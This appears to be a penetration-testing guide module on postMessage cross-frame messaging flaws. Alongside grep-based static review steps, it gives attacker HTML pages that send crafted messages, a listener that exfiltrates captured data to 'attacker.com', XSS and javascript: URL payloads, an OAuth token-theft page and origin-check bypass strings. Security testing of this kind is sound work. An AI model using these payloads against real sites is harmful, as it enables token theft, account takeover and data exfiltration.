# VULN MODULE — postMessage / Cross-Frame Messaging
# Asset: webapp (web applications using iframe communication)
# See also: asset/browserext/vuln/postmessage.md for extension-specific variant
# Report ID prefix: WEB-PM

## THREAT MODEL

postMessage() is the browser's cross-origin communication API.
When origin validation is missing or incorrect, attacker pages can:
  - Send malicious messages to trusted frames (write-side attack)
  - Listen to sensitive messages from trusted frames (read-side attack)
  - Trigger sensitive actions in embedded iframes (CSRF-equivalent)
  - Extract secrets from postMessage data (token theft)

Common patterns that introduce this vulnerability:
  - Payment iframes (Stripe, PayPal embeds)
  - OAuth popup flows
  - Embedded widgets (chat, maps, analytics)
  - Single-page apps with iframe micro-frontends
  - Browser extension ↔ page communication

## VULNERABILITY CLASSES

1. Missing origin check → sensitive action    CWE-346  — High/Critical
2. Wildcard origin in postMessage send        CWE-346  — Medium/High
3. Sensitive data in postMessage payload      CWE-200  — Medium/High
4. postMessage → eval / innerHTML sink        CWE-79   — High (XSS)
5. Clickjacking-assisted postMessage abuse    CWE-1021 — Medium

## WHITEBOX STATIC ANALYSIS

```bash
# All message event listeners — the attack surface
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" --include="*.ts"
grep -rn "window\.onmessage\b" --include="*.js" --include="*.ts"

# Origin validation (or lack thereof)
grep -rn "event\.origin\|message\.origin" --include="*.js" --include="*.ts"
# For EVERY message listener found above:
# Check: is event.origin validated BEFORE processing event.data?
# Flag any listener that processes data WITHOUT checking origin first

# Dangerous sinks fed by message data
grep -rn "event\.data\b" --include="*.js" --include="*.ts" -A3
# Check: does event.data flow into:
#   innerHTML, outerHTML, insertAdjacentHTML, document.write  → Stored/DOM XSS
#   eval(), new Function(), setTimeout(str), setInterval(str) → JS injection
#   location.href, location.assign(), location.replace()      → open redirect / XSS via javascript: URL
#   fetch(), XMLHttpRequest, axios                            → SSRF / request forgery
grep -rn "location\.href\s*=\s*\|location\.assign(\|location\.replace(" --include="*.js" --include="*.ts"
# If any of these receive event.data values → javascript: URL XSS candidate

# postMessage sends with wildcard origin (data leakage)
grep -rn "postMessage.*['\"][*]['\"]" --include="*.js" --include="*.ts"
# Any postMessage(sensitiveData, "*") is a finding

# React / framework-specific
grep -rn "useEffect.*message\|\.on.*message" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx"
```

## BLACKBOX TESTING

### Step 1 — Enumerate message handlers
```javascript
// Inject into target page via browser console or proxy-injected script
// Monitor ALL incoming message events
const orig = window.addEventListener.bind(window);
window.addEventListener = function(type, handler, ...args) {
  if (type === 'message') {
    const wrapped = function(e) {
      console.log('[postMessage IN]', {
        origin: e.origin,
        data: e.data,
        source: e.source
      });
      return handler.call(this, e, ...args);
    };
    return orig(type, wrapped, ...args);
  }
  return orig(type, handler, ...args);
};
// Then interact with the app and observe logged messages
```

### Step 2 — Test missing origin check (write attack)
```html
<!-- attacker.html — serve on a different origin -->
<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://target.com';

// Open target in iframe
const frame = document.createElement('iframe');
frame.src = TARGET + '/dashboard';
document.body.appendChild(frame);

frame.onload = () => {
  // Send crafted message — replace type/action with values from static analysis
  frame.contentWindow.postMessage({
    type: 'SET_CONFIG',        // observed message type
    action: 'updateProfile',
    data: { email: 'attacker@evil.com' }
  }, '*');                     // wildcard = no origin restriction on sender side

  // Also try string-based messages
  frame.contentWindow.postMessage('{"type":"navigate","url":"javascript:alert(1)"}', '*');
};
</script>
</body>
</html>
```

### Step 3 — Test data leakage (read attack)
```html
<!-- Listen for any messages sent with wildcard origin from target -->
<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener('message', (e) => {
  console.log('[RECEIVED from ' + e.origin + ']', e.data);
  // Exfiltrate to attacker server
  fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify({
    origin: e.origin,
    data: e.data
  })));
});

// Open target in popup (some apps use popups for OAuth)
window.open('https://target.com/oauth/callback', 'popup', 'width=500,height=600');
</script>
</body>
</html>
```

### Step 4 — postMessage → XSS via DOM sink
```javascript
// If event.data feeds into innerHTML without sanitization:
frame.contentWindow.postMessage({
  template: '<img src=x onerror="alert(document.domain)">',
  html: '<script>alert(document.domain)<\/script>'
}, '*');

// If event.data feeds into location.href / location.assign / location.replace:
// The javascript: protocol causes JS execution in the target frame's context
frame.contentWindow.postMessage({
  redirect_url: 'javascript:alert(document.domain)',
  return_url:   'javascript:alert(document.domain)',
  url:          'javascript:alert(document.domain)',
  next:         'javascript:alert(document.domain)'
}, '*');

// Also try:
frame.contentWindow.postMessage('{"action":"navigate","url":"javascript:alert(document.domain)"}', '*');
// String-serialized payloads are common in older codebases that use JSON.parse(event.data)
```

### Step 5 — OAuth token theft via postMessage
```html
<!-- Some OAuth flows send tokens via postMessage to the opener -->
<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener('message', (e) => {
  if (e.data && (e.data.token || e.data.access_token || e.data.code)) {
    console.log('[OAuth token received]', e.data);
    // Token stolen — now use it
  }
});
// Initiate OAuth flow — target will postMessage the token back to window.opener
window.open('https://target.com/auth/start?redirect_uri=https://attacker.com', '_blank');
</script>
</body>
</html>
```

## ORIGIN VALIDATION BYPASS PATTERNS

Even when origin IS checked, these bypasses are worth testing:

```javascript
// Bypass 1: startsWith check (no end anchor)
// Vulnerable: if (event.origin.startsWith('https://trusted.com'))
// Bypass: https://trusted.com.attacker.com
//         https://trusted.com@attacker.com
// The check passes because the string starts with 'https://trusted.com'

// Bypass 2: includes check
// Vulnerable: if (event.origin.includes('trusted.com'))
// Bypass: https://attacker.com?x=trusted.com
//         https://trusted.com.evil.com
//         https://notrusted.com  ← 'trusted.com' appears literally in domain

// Bypass 3: null origin (sandboxed iframe)
// Some handlers allowlist null:
// if (event.origin === null || event.origin === 'https://trusted.com')
// Bypass: send from a sandboxed iframe — its origin reports as "null"
// <iframe sandbox="allow-scripts" srcdoc="<script>parent.postMessage('payload','*')<\/script>"></iframe>

// Bypass 4: regex with ^ anchor but no $ end anchor
// Vulnerable: if (/^https:\/\/payments\.example\.com/.test(event.origin))
// Bypass: https://payments.example.com.attacker.io
//         The regex matches the prefix — the suffix is unchecked
// Detection: grep for regex patterns without trailing $ or \b after the domain

// Bypass 5: fully unanchored regex
// Vulnerable: if (/trusted\.com/.test(event.origin))
// Bypass: https://attacker.com/trusted.com  (path contains the string)
//         https://attacker.com?trusted.com  (query string contains it)

// Bypass 6: protocol check only
// Vulnerable: if (event.origin.startsWith('https://'))
// Bypass: any https:// origin — completely useless check
// Common in quick fixes that only guard against http://
```

### Grep — detect weak regex patterns in code
```bash
# Find regex origin checks that may lack end anchor ($)
grep -rn "\.test(event\.origin)\|\.test(message\.origin)" --include="*.js" --include="*.ts"
# For each hit: read the regex — does it end with \b, $, or a port :NNN)?
# If it ends with the domain name followed by / → likely bypassable with domain.attacker.com

# Find startsWith / includes checks
grep -rn "event\.origin\.startsWith\|event\.origin\.includes\|event\.origin\.indexOf" \
  --include="*.js" --include="*.ts"
```

---

## TOOLS

### Blackbox — dynamic interception and monitoring

| Tool | Purpose | How to use |
|------|---------|-----------|
| **Burp Suite DOM Invader** | Auto-detects postMessage handlers, injects canary values, traces data to DOM sinks | Enable in Burp browser → visit target → check DOM Invader tab for postMessage events |
| **PostMessage-Tracker** (Chrome extension) | Logs every `postMessage` sent/received with origin, data, and source frame | Install extension → visit target → check extension popup for message log |
| **Untrusted Types** (Chrome extension) | Tracks data flow from postMessage sources to dangerous DOM sinks (Trusted Types integration) | Install → visit target → violations appear in DevTools console |

### Browser DevTools — breakpoint-based analysis

```
1. Open DevTools → Sources tab (Chrome) or Debugger (Firefox)
2. In Chrome: Sources → Event Listener Breakpoints → Message → message
   (This breaks on every MessageEvent before any handler runs)
3. Interact with the target app (trigger iframe loads, OAuth flows, etc.)
4. When breakpoint hits: inspect event.origin, event.data, and call stack
5. Step through handler code to find where event.data is used
```

Alternative — xhr/fetch monitoring to catch token exfiltration:
```javascript
// Paste in DevTools console on the target page
const origFetch = window.fetch;
window.fetch = function(...args) {
  console.log('[fetch]', args[0], args[1]);
  return origFetch(...args);
};
const origXHR = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
  console.log('[XHR]', method, url);
  return origXHR.apply(this, arguments);
};
```
